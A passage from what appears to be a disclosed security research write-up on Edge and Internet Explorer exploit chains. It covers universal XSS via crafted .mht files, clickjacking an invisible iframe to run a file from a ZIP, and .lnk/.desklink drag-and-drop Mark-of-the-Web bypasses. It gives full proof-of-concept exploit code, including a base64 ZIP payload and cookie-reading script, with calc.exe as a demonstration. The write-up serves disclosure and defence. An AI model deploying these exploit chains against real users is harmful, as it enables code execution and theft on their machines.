<iframe src="cid:abc123"></iframe>
```

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/9264baff-temp-5.gif)

*Demonstration of the attack*

The logic here is the same as in **Bug 1**, but instead of loading an `.html` file, we now need to load an `.mht` file. Edge does not allow automatic loading of `.mht` files, considering this extension unsafe, but we can still load files manually with a single click anywhere on the page.

Localhost XSS to UXSS Proof of Concept:

```
<base href="file:///"/>
<iframe name="test" hidden onload=this.setAttribute("onload","try{this.contentDocument}catch(e){setTimeout(function(){runHtml('root')},1000)}")></iframe>
<script>
getUsername = function() {
    setTimeout("runHtml('root')", 500)
}
runEdge = function() {
    window.open('microsoft-edge:' + location + '#step2', 'test')
}
dropHTML = function() {
    document.write("<h1>click anywhere</h1>")
    onclick = function() {
        const data = "MIME-Version: 1.0\n\
            Content-Type: multipart/related; boundary=\"----=_NextPart_01DA7EFD.26369D30\"\n\
            \n\
            ------=_NextPart_01DA7EFD.26369D30\n\
            Content-Type: text/html\n\
            Content-Transfer-Encoding: 7bit\n\
            Content-Location: https://msn.com/1\n\
            \n\
            <meta http-equiv=\"refresh\" content=\"2, URL=https://msn.com/1\">\n\
            <iframe src=\"cid:aabb\"></iframe>\n\
            ------=_NextPart_01DA7EFD.26369D30\n\
            Content-Type: text/html\n\
            Content-Transfer-Encoding: 7bit\n\
            Content-ID: <aabb>\n\
            Content-Location: https://msn.com/2\n\
            \n\
            <!DOCTYPE html><html><head>\n\
            <base href=\"http://msn.com/2\">\n\
            \n\
            </head>\n\
            <body>\n\
            <iframe name=\"uxss\" src=\"/aaa/111\"></iframe>\n\
            <script>window.onload=function(){alert(uxss.document.domain + \":::\" + uxss.document.cookie)}<\/script>\n\
            \n\
            </body></html>\n\
            ------=_NextPart_01DA7EFD.26369D30--";
        const blob = new Blob([data], {
            type: 'text/plain'
        });
        url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url
        link.id = "aa"
        link.target = "test2"
        link.download = 'aaa_temp_mht.mht';
        link.innerText = 'blob';
        link.click()
        URL.revokeObjectURL(link.href);
        setTimeout(function() {
            window.close();
        }, 5000)
    }
}
runHtml = function(usr) {
    try {
        open("//localhost//\\\\localhost\\c:\\users\\" + usr + "\\downloads\\aaa_temp_mht.mht", "test") +
            open("//localhost//c:/users/" + usr + "/downloads/aaa_temp_mht.mht", "test")
    } catch (e) {}
}
if (location.hash == "#step2") {
    document.write("<h1>click anywhere</h1>")
    onclick = function() {
        dropHTML();
    }
} else {
    runEdge();
    setTimeout(function() {
        getUsername();
    }, 2000);
}
</script>

```

**How it works:**

- The `dropHTML()` function contains a variable with the exploit’s source code—this is the `.mht` file.
- The main part of the exploit (`Content-Location: https://msn.com/1`) loads the second part of the archive via `<iframe src="cid:aabb">`.
- The part with `Content-Location: https://msn.com/2` and `Content-ID: <aabb>` loads a new frame. The URL of this frame (`/aaa/111`) is not specified in the web archive, which leads to the loading of **real content** from [msn.com](http://msn.com/) at the specified path.
- Accessing this frame via JavaScript is possible because `Content-Location` (the spoofed origin) and the target frame’s origin match—SOP considers them to be the same origin.
- Sometimes the exploit requires a reload—this behavior is implemented via the tag `<meta http-equiv="refresh">` in the first part, which reloads the page every two seconds.

**UXSS via local .MHT summary:**

- It requires **one click** in the Edge window to trigger the download of an unsafe file type.
- It allows us to execute JavaScript on an arbitrary site (Universal XSS).
- It requires an already installed local web application vulnerable to XSS (as in the previous bugs).

## Not a bug, but a feature 5

🐛 Feature,[ VULN-139383](https://msrc.microsoft.com/report/vulnerability/VULN-139383), [VULN-169397](https://msrc.microsoft.com/report/vulnerability/VULN-169397)

Recall that using `<iframe>`, we can not only automatically open files but also retrieve a listing of local folders or folders on a remote SMB server. This functionality is very similar to `explorer.exe` and allows us to copy, delete, and execute files using the mouse.

### 1. RCE via clickjacking. Type 1

Using the HTML tag `<iframe>`, you can open a folder or files that are displayed as a folder:

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/abd374bb-image.png)

- A local folder or a folder on an SMB server
- A ZIP archive
- A .search-ms file (a saved search is not exactly a folder, but has similar functionality).

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/287a0ca5-image.png)

*The logic behind the new chain*

-  A malicious page opens [http://localhost](http://localhost%20hosting/) hosting an application vulnerable to XSS (legitimate technique).
- The XSS payload at [http://localhost](http://localhost%20launches/) launches an Edge window, pointing to its location.
- Using the Edge window, the XSS payload saves files `proxy.html` and `exploit.zip` to `~/Downloads/`**without the MOTW tag**. The obtained files inherit the MOTW settings from their archive.
- The Internet Explorer window redirects the page from [http://localhost](http://localhost%20to/) to the locally saved HTML file, using the vulnerability from **Bug 1**. The loaded HTML page opens the ZIP file containing the exploit using `<iframe>`.
- The user needs to double-click on the file name inside `<iframe>` to execute it.

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/97970a97-temp-6.gif)

*Attack demonstration*

I used JavaScript to set the `<iframe>` element size to 5 × 5 pixels. Then I configured it so that it is always under the cursor—this allows clicks to be made anywhere on the page while actually hitting elements inside the invisible frame.

Exploit listing

```html
<base href="file:///"/>
<h1>Wait...</h1>
<div id=d1 style="OPACITY: 0; POSITION: absolute; LEFT: 0px; Z-INDEX: 50; TOP: 0px">
<div id=d2 style="MARGIN-TOP: -60px; MARGIN-LEFT: -60px">
<iframe style="OVERFLOW: hidden; HEIGHT: 50px; WIDTH: 50px" name="test" scrolling="no"></iframe>
</div>
</div>
<script>
window.onload = function(){
    document.documentElement.addEventListener('mousemove', function(e) {
        d1.style.left = e.clientX + 15 + "px";
        d1.style.top =   e.clientY + 15 + "px";
    })
}
getUsername = function(){
    setTimeout("runHtml('root')", 500)
}
runEdge = function(){
    window.open('microsoft-edge:'+location+'#step2','test')
    setTimeout(function(){
            window.open('microsoft-edge:'+location+'#step3','test')
    },500)
    setTimeout(function(){
        window.open('microsoft-edge:'+location+'#step4','test')
    },1000)
}
dropHTML1 = function(){
    data = '<h1>Double click anywhere</h1>\n\
        <script>\n\
        if(location.hash != "#step2"){\n\
            setTimeout(function(){\n\
                top.location = location + "#step2" ;\n\
            },1000)\n\
        }else if(location.hash != "#step3"){\n\
            location.hash = "#step3"\n\
            a=window.open(location)\n\
            setTimeout(function(){\n\
                a.close();\n\
                document.documentElement.attachEvent("onmousemove", function(e) {\n\
                    d1.style.left = e.clientX - 5 + "px";\n\
                    d1.style.top =   e.clientY - 5 + "px";\n\
                })\n\
            },1000)\n\
        }else{\n\
        }\n\
        <\/script>\n\
        <DIV id=d1 style="opacity:0; POSITION: absolute; LEFT: 0px; Z-INDEX: 50; TOP: 0px">\n\
        <DIV id=d2 style="MARGIN-TOP: -30px; MARGIN-LEFT: -50px">\n\
        <iframe style="OVERFLOW: hidden; HEIGHT: 40px; WIDTH: 60px"  src="./aaa_temp_zip2.html" scrolling="no"></iframe>\n\
        </DIV>\n\
        </DIV>'
    blob = new Blob([data], { type: 'text/html' });
    link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'aaa_temp_zip.html';
    link.click();
    URL.revokeObjectURL(link.href);
    setTimeout(function(){
        close();
    },3500)
}
dropHTML2 = function(){
    data = '<iframe width="500" height="500" src="aaa_temp_zip.zip" scrolling="no" style="position:absolute;margin-top: 0px; margin-left: 0px;transform: scale(0);overflow:hidden;"></iframe>'
    blob = new Blob([data], { type: 'text/html' });
    link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'aaa_temp_zip2.html';
    link.click();
    URL.revokeObjectURL(link.href);
        setTimeout(function(){
            close();
        },3500)
    }
dropZIP = function(){
    data = "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";
    link2 = document.createElement('a');
    link2.href = "data:text/plain;base64," + data;
    link2.download = 'aaa_temp_zip.zip';
    link2.click();
    setTimeout(function(){
        close();
    },4000)
}
runHtml = function(usr){
    setTimeout(function(){
        open("//localhost//\\\\localhost\\c:\\users\\"+usr+"\\downloads\\aaa_temp_zip.html","test");
        open("//localhost//c:/users/"+usr+"/downloads/aaa_temp_zip.html","test");
    },500)
}
if(location.hash == "#step2"){
    dropHTML1();
}else if(location.hash == "#step3"){
    dropHTML2();
}else if(location.hash == "#step4"){
    dropZIP();
}else{
    runEdge();
    setTimeout("getUsername()", 6000);
}
</script>
```

**What happens in the code:**

- An invisible `<div>` with absolute positioning is created.
- When the mouse moves, `<div>` follows the cursor.
- Inside**`<div>` is `<iframe>` containing a folder or a ZIP archive.
- When the user clicks anywhere on the page, the click actually hits the invisible `<iframe>`, and if there was a file there—it executed.

**Conclusion for this chain:**

The exploit uses a base64 representation of a ZIP file containing the malicious file. When decoded, it results in an archive containing the `calc.exe` file.

- Arbitrary command execution without any security prompts.
- Requires the ability to conduct an XSS attack on an already installed vulnerable web application on the local host.
- Requires a double mouse click anywhere on the page to execute the file.

### 2. RCE via clickjacking. Type 2

Using the built-in debugger console, I inspected the code of the `<iframe>` element displaying the file list. Unexpectedly, I discovered that instead of a regular HTML document, inside there is an **ActiveX object** with CLSID**`8856F961-340A-11D0-A96B-00C04FD705A2` (ProgID: `Shell.Explorer.2`).

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/a75cd77e-image.png)

I was even more surprised when I decided to edit this object—many different parameters and settings became visible:

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/1943fe6b-image.png)

The `<PARAM name="SingleClick">` parameter immediately caught my attention. I assumed this setting would allow me to launch files using just one click instead of two. However, initial tests showed that reducing the number of clicks to one was not that simple. When launching the ActiveX component from a local file, an alert appears requiring a separate confirmation:

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/3a9b7a1d-image.png)

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/0ce81b60-temp-7.gif)

*Attack demonstration*

**Conclusion:**

- Two clicks are required to complete RCE, but following a different scenario:

- The first click enables blocked active content.
- The second click executes the file.

- Theoretically, if the security prompt is bypassed, user interaction could be reduced to a single click.

### 3. RCE via drag and drop. Type 1

Besides clicking on files, users can drag files between windows. Another discovery of mine: if you drag any file onto a specially crafted *`.lnk`* (shortcut) file, the program launches, but the **MOTW check is not performed**, and the security confirmation dialog box, like the one in the example below, does not appear.

For example, the security prompt during a normal launch of `.lnk` with a MOTW tag looks like this:

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/ac058180-image.png)

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/b918bee3-image.png)

*Chain logic*

- The malicious page opens at [http://localhost](http://localhost%20hosting/) hosting an application vulnerable to XSS (legitimate technique).
- The XSS attack launches an Edge window with the address of its location.
- The Edge window saves `exploit.zip` to `~/Downloads/` with a MOTW tag. Inside the archive there is a specially crafted .lnk file.
- The Internet Explorer window redirects the page from [http://localhost](http://localhost%20to/) to the locally saved ZIP file, using the vulnerability from Bug 1.
- The user needs to drag any file (for example, from the desktop) onto `.lnk` inside the ZIP archive, displayed in the browser via `<iframe>`. As a result, the command specified in the shortcut is executed.

*Example of creating a malicious .lnk file:*
The Target field contains the command executed upon launch (for example, `C:\windows\System32\cmd.exe /c calc.exe`).

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/705e091a-image.png)

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/ba2a9862-temp-8.gif)

*Attack demonstration*

**Conclusion for this chain:**

- It does not require clicking on security prompts.
- The MOTW protection mechanism can be bypassed.

### 4. RCE via drag and drop. Type 2

Windows has several built-in file extensions that handle object drag-and-drop:

- .**mapimail**: opens Outlook and uses the dragged file as an attachment for a new email.
- .**mydocs**: creates a shortcut to the dragged file in the `~/Documents/` folder.
- .**desklink**: creates a shortcut to the dragged file on**`~/Desktop/`.
- .**zfsendtotarget**: creates an archive containing the dragged file.

If you drag any file onto a file with the `.desklink` extension (for example, in an Explorer window or a browser `<iframe>`), an `.lnk` shortcut pointing to the dragged file will be created on the desktop. But when you drag an `.lnk` file to the `.desklink` file it will just place a copy of `.lnk` onto desktop. At the same time, you can set an arbitrary icon and name—for example, “This PC” with a computer icon or “Secret photos” with a folder icon.

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/aed4a917-image.png)

*Chain logic*

- The malicious page opens at [http://localhost](http://localhost%20hosting/) hosting an application vulnerable to XSS (legitimate technique).
- The XSS payload launches an Edge window, pointing to its location.
- The Edge window saves the files `proxy.html` and `exploit.zip` to `~/Downloads/` with a MOTW tag. The `exploit.zip` archive contains the files `.desklink` and `.lnk`.
- The Internet Explorer window redirects the page from [http://localhost](http://localhost/) to the locally saved HTML file, using the vulnerability from Bug 1. The HTML file displays the contents of the ZIP archive via `<iframe>`.
- When the user drags the malicious `.lnk` file (from the archive) onto the `.desklink` file (also from the archive), a copy of the shortcut is created on the desktop.
- Now the user only has to launch this shortcut from the desktop.

![](https://swarm.ptsecurity.com/wp-content/uploads/2026/06/41d68a42-temp-9.gif)

*Attack visualization*

**Why am I showing this example?** With a slight modification, it also leads to a MOTW bypass.

Initially, I tested this technique using a local SMB server. That is when I noticed: when copying files not from a ZIP archive, but directly from an SMB server by dragging them onto `.desklink`, no additional confirmations appeared before launching these files from the desktop. Presumably, this behavior occurs because a file inside a ZIP archive inherits the MOTW from the archive, but when copying from an SMB server, the MOTW is only applied after the copying is complete. The non-standard copying method (drag and drop) disrupts this logic, and the MOTW is not set.

**Conclusion for this technique:**

- It allows us to write a malicious shortcut to the desktop with an arbitrary icon and name.
- It does not require clicking through security pop-ups.
- It allows us to bypass MOTW when copying `.lnk` from an SMB server.
- It requires additional interaction—launching the file from the desktop, which looks quite realistic given a plausible icon and name.

## Final remarks

The main issue that would allow attackers to open a local file using JavaScript at [http://localhost ](http://localhost%20was/)was fixed in September 2024, while I was still looking for other vulnerabilities to build chains.

In my case, the research started with an XSS attack in a desktop application that allowed attackers to execute JavaScript from [http://localhost](http://localhost/) (the origin). I also discovered the possibility of conducting XSS attacks in other desktop applications. In these cases, the injected JavaScript code was executed from `file:///` (the origin). This condition means that some of the payloads described in this article, which are considered “features”, still allow threat actors to escalate XSS attacks in vulnerable applications to RCE.

*Article published with Microsoft’s permission.*
